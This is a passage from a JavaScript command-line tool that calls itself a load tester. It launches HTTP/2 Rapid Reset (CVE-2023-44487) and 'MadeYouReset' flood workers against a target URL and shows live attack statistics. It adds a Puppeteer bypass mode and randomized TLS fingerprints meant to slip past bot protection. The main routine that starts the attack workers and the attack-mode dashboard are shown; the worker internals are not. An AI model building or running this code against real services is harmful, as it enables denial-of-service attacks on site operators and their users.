        // Keep original vertical layout for attack mode
        console.log(chalk.white.bold('Target: ') + chalk.green(`${target.protocol}//${target.host}:${target.port}${target.path}`));
        console.log(chalk.white.bold('Time Remaining: ') + chalk.yellow(formatTime(timeRemaining)));
        console.log('');
        const attackName = attackMode === 'rapid-reset' ? 'Rapid Reset (CVE-2023-44487)' : 'MadeYouReset';
        const totalResetsAndErrors = (stats.statusCounts['RESET'] || 0) + stats.attackErrors;
        console.log(chalk.bgRed.white.bold(` HTTP/2 Attack ACTIVE: ${attackName} `));
        console.log(chalk.white.bold('Attack Streams Sent: ') + chalk.magenta(stats.attackSent));
        console.log(chalk.white.bold('Attack Responses Rcvd: ') + chalk.magenta(stats.attackReceived));
        console.log(chalk.white.bold('Attack Errors/Resets: ') + chalk.red(totalResetsAndErrors));

    } else {
        // New horizontal layout for standard mode
        const leftColumn = [];
        const rightColumn = [];

        leftColumn.push(chalk.white.bold('Target: ') + chalk.green(`${target.protocol}//${target.host}:${target.port}${target.path}`));
        leftColumn.push(chalk.white.bold('Time Remaining: ') + chalk.yellow(formatTime(timeRemaining)));
        const mode = argv.protocol ? 'Forced' : 'Detected';
        leftColumn.push(chalk.white.bold(`Protocols (${mode}): `) + chalk.cyan(activeProtocols.map(p => p.toUpperCase()).join(', ') || '...'));

        const rps = (stats.requestsSent / elapsedSeconds || 0).toFixed(2);
        const avgLatency = (stats.totalLatency / stats.responsesReceived || 0).toFixed(2);
        rightColumn.push(chalk.white.bold('Total Requests Sent: ') + chalk.blue(stats.requestsSent));
        rightColumn.push(chalk.white.bold('Total Responses Rcvd: ') + chalk.blue(stats.responsesReceived));
        rightColumn.push(chalk.white.bold('Requests/Second: ') + chalk.magenta(rps));
        rightColumn.push(chalk.white.bold('Avg Latency: ') + chalk.yellow(`${avgLatency} ms`));
        
        // Add Puppeteer stats if bypass mode is enabled
        if (bypassMode || puppeteerOnly) {
            const puppeteerSuccessRate = stats.puppeteerRequests > 0 
                ? ((stats.puppeteerSuccess / stats.puppeteerRequests) * 100).toFixed(1)
                : '0.0';
            rightColumn.push(chalk.white.bold('Puppeteer Requests: ') + chalk.blue(stats.puppeteerRequests));
            rightColumn.push(chalk.white.bold('Puppeteer Success: ') + chalk.green(`${stats.puppeteerSuccess} (${puppeteerSuccessRate}%)`));
        }
        
        // Add Chrome path info
        rightColumn.push(chalk.white.bold('Chrome Path: ') + (chromeExecutable ? chalk.green('System') : chalk.yellow('Puppeteer')));
        
        const maxLeftLength = Math.max(...leftColumn.map(line => stripAnsi(line).length));
        const padding = 5;

        const maxRows = Math.max(leftColumn.length, rightColumn.length);
        for (let i = 0; i < maxRows; i++) {
            const left = leftColumn[i] || '';
            const right = rightColumn[i] || '';
            const leftPadded = left + ' '.repeat(Math.max(0, maxLeftLength - stripAnsi(left).length));
            console.log(`${leftPadded}${' '.repeat(padding)}${right}`);
        }
    }

    console.log('');
    console.log(chalk.white.bold('Response Status Counts:'));
    
    if (attackMode !== 'none') {
        const sortedAttackStatuses = Object.keys(stats.statusCounts).sort();
        if (sortedAttackStatuses.length === 0) {
            console.log(chalk.gray('  (waiting for responses...)'));
        } else {
            sortedAttackStatuses.forEach(code => {
                const color = code === 'RESET' ? chalk.green : chalk.red;
                const message = HTTP_STATUS_CODES[code] || 'Unknown';
                console.log(`  ${color(code)} (${message}): ${chalk.blue(stats.statusCounts[code])}`);
            });
        }
    } else {
        if (Object.keys(stats.protocolStats).length === 0 || activeProtocols.length === 0) {
             console.log(chalk.gray('  (waiting...)'));
        } else {
            const allStatusCodes = new Set();
            activeProtocols.forEach(p => {
                Object.keys(stats.protocolStats[p].statuses).forEach(code => allStatusCodes.add(code));
            });

            const sortedStatuses = Array.from(allStatusCodes).sort((a, b) => b - a);
            
            if (sortedStatuses.length === 0) {
                 console.log(chalk.gray('  (waiting for responses...)'));
            } else {
                const COLUMN_WIDTH = 30;
                let header = '';
                activeProtocols.forEach(p => {
                    const title = `Protocol: ${p.toUpperCase()}`;
                    const styledTitle = chalk.white.bold.underline(title);
                    const visibleLength = stripAnsi(styledTitle).length;
                    header += styledTitle + ' '.repeat(Math.max(0, COLUMN_WIDTH - visibleLength));
                });
                console.log(header);

                sortedStatuses.forEach(code => {
                    let row = '';
                    activeProtocols.forEach(protoKey => {
                        const pStats = stats.protocolStats[protoKey];
                        const count = pStats.statuses[code];
                        let cellText = '';
                        if (count) {
                            const color = String(code).startsWith('2') ? chalk.green : String(code).startsWith('3') ? chalk.yellow : code === 'RESET' ? chalk.green : chalk.red;
                            cellText = `  ${color(code)} (${HTTP_STATUS_CODES[code] || 'Unknown'}): ${chalk.blue(count)}`;
                        }
                        const visibleLength = stripAnsi(cellText).length;
                        row += cellText + ' '.repeat(Math.max(0, COLUMN_WIDTH - visibleLength));
                    });
                    console.log(row);
                });
            }
        }
    }
    
    console.log('');
    const logsToShow = attackMode !== 'none' ? lastAttackLogs : lastLogs;
    const logTitle = attackMode !== 'none' ? 'Attack Log' : 'Request Log';

    console.log(chalk.white.bold(`${logTitle} (last 3 events):`));
    if (logsToShow.length === 0) console.log(chalk.gray('  (waiting...)'));
    else logsToShow.forEach(log => console.log(`  ${log}`));

    console.log(chalk.cyan('--------------------------------------------'));
}


// --- Main Execution ---
async function main() {
    console.log(chalk.green('Starting load test...'));
    console.log(chalk.yellow(`Target: ${argv.url} | Duration: ${argv.time} min | Concurrency: ${argv.conc} | Attack: ${attackMode}`));
    
    // Initialize Puppeteer if bypass mode is enabled
    if (bypassMode || puppeteerOnly) {
        await initPuppeteer();
    }

    if (attackMode !== 'none') {
        activeProtocols = ['h2'];
    } else if (argv.protocol) {
        console.log(chalk.cyan(`Forcing specified protocols: ${argv.protocol}`));
        const protocolMap = { '1.1': 'h1', '2': 'h2', '3': 'h3' };
        activeProtocols = argv.protocol.split(',').map(p => protocolMap[p.trim()]).filter(Boolean);
        if (activeProtocols.length === 0) {
            throw new Error('Invalid protocol(s) specified. Use "1.1", "2", or "3".');
        }
    } else {
        console.log(chalk.cyan('Auto-detecting supported protocols...'));
        let detected = new Set();
        await new Promise(resolve => {
            const req = https.request({
                method: 'HEAD', host: target.host, port: target.port, path: '/',
                rejectUnauthorized: false, ALPNProtocols: ['h2', 'http/1.1'], ...getRandomTlsProfile()
            }, res => {
                const altSvc = res.headers['alt-svc'];
                if (altSvc && altSvc.includes('h3')) detected.add('h3');
                res.socket.destroy();
                resolve();
            });
            req.on('socket', socket => {
                socket.on('secureConnect', () => {
                    const alpn = socket.alpnProtocol;
                    if (alpn === 'h2') detected.add('h2');
                    else detected.add('h1');
                });
            });
            req.on('error', () => { detected.add('h1'); resolve(); });
            req.end();
        });
        activeProtocols = Array.from(detected);
        if (activeProtocols.length === 0) activeProtocols.push('h1');
    }
    console.log(chalk.green(`Protocols to be used: ${activeProtocols.map(p => p.toUpperCase()).join(', ')}`));

    activeProtocols.forEach(p => {
        stats.protocolStats[p] = { responses: 0, statuses: {} };
    });

    const workerCounts = {};
    if (attackMode === 'none' && activeProtocols.length > 0) {
        const concPerProtocol = Math.floor(concurrency / activeProtocols.length);
        activeProtocols.forEach(p => workerCounts[p] = concPerProtocol);
        let remainder = concurrency % activeProtocols.length;
        for (let i = 0; i < remainder; i++) {
            workerCounts[activeProtocols[i]]++;
        }
    } else {
        workerCounts['h2'] = concurrency;
    }
    
    let workerId = 0;
    for (const protocolKey in workerCounts) {
        const count = workerCounts[protocolKey];
        for (let i = 0; i < count; i++) {
            if (attackMode !== 'none') {
                startHttp2AttackWorker();
            } else {
                let client;
                if (protocolKey === 'h3') {
                    client = new Client(targetUrl, { connect: { rejectUnauthorized: false, ...getRandomTlsProfile() } });
                } else if (protocolKey === 'h2') {
                    client = new Client(targetUrl, { connect: { rejectUnauthorized: false, ...getRandomTlsProfile() } });
                } else { // h1
                     client = new Client(targetUrl, { connect: { rejectUnauthorized: false, ...getRandomTlsProfile() }, pipelining: 1 });
                }
                runStandardWorker(workerId++, client, protocolKey);
            }
        }
    }


    const monitorInterval = setInterval(updateMonitor, 250);

    setTimeout(() => {
        isRunning = false;
        clearInterval(monitorInterval);
        updateMonitor();
        console.log(chalk.green.bold('\nTest finished!'));
        closePuppeteer();
        process.exit(0);
    }, durationMs);

    process.on('SIGINT', () => {
        isRunning = false;
        clearInterval(monitorInterval);
        updateMonitor();
        console.log(chalk.red.bold('\nTest interrupted by user.'));
        closePuppeteer();
        process.exit(1);
    });
}

main().catch(err => {
    console.error(chalk.red('A critical error occurred:'), err);
    closePuppeteer();
    process.exit(1);
});
